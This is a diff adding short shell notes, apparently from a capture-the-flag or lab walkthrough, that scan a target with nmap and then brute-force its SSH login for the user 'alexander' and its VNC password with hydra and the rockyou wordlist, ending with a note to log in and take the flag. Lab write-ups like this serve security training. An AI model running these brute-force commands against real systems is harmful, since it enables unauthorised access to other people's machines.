@@ -1,0 +1,16 @@
+export IP=<IP-Address>
+
+#scan the network for open ports
+sudo nmap -sS $IP -o nmap/initial_scan.log
+
+#using hydra to crack passwords
+hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://$IP -V
+
+#crack password for vnc client of $IP using hydra
+hydra -P /usr/share/wordlists/rockyou.txt vnc://$IP -V
+
+#open attackbox and connect to vnc client as mentioned in the website.
+#unable to connect to vnc client via terminal in kali linux
+
+#connect to client using the cracked password from the hydra search
+#get the flag from connected client....
